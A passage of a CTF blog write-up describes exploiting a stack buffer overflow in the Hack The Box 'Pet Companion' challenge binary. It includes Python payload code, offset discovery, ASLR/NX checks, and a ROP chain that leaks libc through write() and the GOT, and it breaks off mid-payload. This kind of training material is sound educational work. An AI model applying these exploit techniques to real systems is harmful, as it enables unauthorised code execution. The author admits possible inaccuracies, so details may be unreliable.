---
title: CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Pet Companion
url: https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/
source: Happy Hacking!
date: 2024-03-18
fetch_date: 2025-10-04T12:08:05.132289
---

# CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Pet Companion

[Skip to content](#content)

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security

![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[← Shellcode – Windows/x86 – Create Administrator User – Dynamic PEB & EDT](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/)

[CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Death Note →](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-death-note/)

# CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Pet Companion

Posted on [March 17, 2024](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/ "11:51 am") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone!

Today I want to write a couple of write-ups of a CTF that we have participated with our work colleagues from Exness. As I’m trying to improve in binary exploitation topic I would like to document here some challenges that I’ve found that were interesting.

This is the CTF link:

<https://www.hackthebox.com/events/cyber-apocalypse-2024>

And this is the team that we were part of:

<https://ctftime.org/team/198916>

First of all, don’t use this document as a guide, I can say something that is not 100% correct. I’m more used to binary exploitation in Windows than in Linux.

Another thing that I would like to comment is that what you are going to see here is the exploitation of the binary without using pwntools. I know that is easier and faster to use that python library, but my goal for now is try to learn as much as I can about the topic, and I’ve found that is better for me to do it without pwntools.

Said that… let’s start!

## Binary Normal Behaviour

In my case, the first thing that I did was to execute the binary and see what was the normal behaviour, it was expecting to receive an string:

![](https://xavibel.com/wp-content/uploads/2024/03/1.png)

After that I opened the binary in IDA and I saw that the function seemed vulnerable to a Buffer Overflow

## Stack Buffer Overflow

To start the exploitation process I’m going to use the following python exploit skeleton:

```
#!/usr/bin/env python3

from pwn import *
import struct
import sys

context.binary = elf = ELF('pet_companion', checksec=False)
glibc = ELF('glibc/libc.so.6', checksec=False)
rop = ROP(elf)

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)

def main():
    p = get_process()

    ### FIRST PAYLOAD - GLIBC ADDRESS LEAK

    offset = 200
    junk = b'A' * offset
    payload  = junk

    with open('payload', 'wb') as f:
      f.write(payload)
```

I’m going to start sending 200 A’s:

```
offset = 200
junk = b'A' * offset
payload  = junk
```

And I can see that the binary is vulnerable to stack buffer overflow:

![](https://xavibel.com/wp-content/uploads/2024/03/2.png)

It may seem that we don’t have control over RIP register, because he see instead of 8 A’s the following value: “0x00000000004006df”

But this is not true, RIP can’t contain AAAAAAAA (0x4141414141414141) because it’s considered a non-canonical memory address, or, in other words, 0x4141414141414141 is a 64-bit wide address and current CPUs prevent applications and OSes to use 64-bit wide addresses.

You can read more about it in the following reference:
<https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/64-bit-stack-based-buffer-overflow>

## RIP Position Identification

The process that I followed to see where I was overwritting RIP is to first of all, generate a pattern:

```
msf-pattern_create -l 200
```

![](https://xavibel.com/wp-content/uploads/2024/03/3.png)

Then I select the first 4 bytes in the stack:

![](https://xavibel.com/wp-content/uploads/2024/03/4.png)

And I look for them and I find the offset:

![](https://xavibel.com/wp-content/uploads/2024/03/5.png)

Finnally, I confirm that we located RIP correctly:

```
offset = 72
junk = b'A' * offset

payload  = junk
payload += struct.pack('<Q', 0x0000424242424242) # RIP
```

![](https://xavibel.com/wp-content/uploads/2024/03/6.png)

## Binary Protections

**ASLR protection** should be enabled, this is a way to check it:

```
readelf -l pet_companion | grep "GNU_STACK"
```

![](https://xavibel.com/wp-content/uploads/2024/03/7.png)

But I want to confirm it. I execute the binary and I find his PID. Then I check it’s process maps:

```
cat /proc/4112016/maps
00400000-00401000 r-xp 00000000 08:01 3950499                            /home/revil/Documents/CTF/HTB02/pet/challenge/pet_companion
...
7feede600000-7feede7e7000 r-xp 00000000 08:01 3950502                    /home/revil/Documents/CTF/HTB02/pet/challenge/glibc/libc.so.6
...
```

Then I close it and execute it again, to see if they memory addresses have changed:

```
cat /proc/4112016/maps
00400000-00401000 r-xp 00000000 08:01 3950499                            /home/revil/Documents/CTF/HTB02/pet/challenge/pet_companion
...
7fcdf5c00000-7fcdf5de7000 r-xp 00000000 08:01 3950502                    /home/revil/Documents/CTF/HTB02/pet/challenge/glibc/libc.so.6
...
```

**NX protection** is also enabled, this means that the stack is not executable and that we need to use ROP. We can verify this by using the command “checksec” in GDB:

![](https://xavibel.com/wp-content/uploads/2024/03/8.png)

## LIBC memory address leak

So the next step, is to leak a LIBC memory address, that is needed before being able to find rop gadgets in LIBC and use them to make a system syscall and get a shell.

To leak LIBC memory address I used the following trick. Thank you Toni!!! =)

First we need locate a write function that is called in the binary itself, then prepare the function call to write setting up the function parameters. And finnally execute the call and display in the screen a memory address of LIBC.

Let’s remember how to pass parameters to a function in x64. We need to use registers in the following order: RDI, RSI, RDX, RCX, R8 and R9. If there are more parameters, they need to be in the stack.

Then also, let’s check the linux syscall write:

```
ssize_t write(int fd, const void buf[.count], size_t count);
```

So let’s start with the first part of the process. Let’s prepare the function call parameters, we need a 1 that is the value related with the file descriptor STDOUT to print in the screen, and we need it in the register RDI.

To find a “POP RDI” gadget I use Ropper tool:
<https://github.com/sashs/Ropper>

And I use the following command:

```
ropper --file ../../challenge/glibc/libc.so.6 -a x86_64 --search "pop rsi"
```

Then we put this gadget and the value 1 of the file descriptor in the code:

```
payload  = junk
payload += struct.pack('<Q', 0x0000000000400743) # POP RDI, RET                  pet companion binary
payload += struct.pack('<Q', 0x1)                # STDOUT
```

Now that we have the file descriptor ready, we need to setup in RSI the second parameter, that is the buffer.

I use again Ropper and I find a gadget to pop the value that we need in the register RSI. Also, we need to find the write function GOT table inside the binary. That is what is going to give us a valid address inside GLIBC. We can use the following command:

```
objdump -R ../../challenge/pet_companion | grep -i write
```

This is the final code for this part, you may notice that I pop a junk value after the GOT write one, this is because the gadget that I’ve found will pop something else in another register that we don’t need.

```
payload += struct.pack('<Q', 0x0000000000400741) # POP RSI, POP R15, RET         pet companion binary

# objdump -R ../../challenge/pet_companion | grep -i write
payload += struct.pack('<Q', 0x0000000000600fd8) # GOT WRITE FUNCTION            ...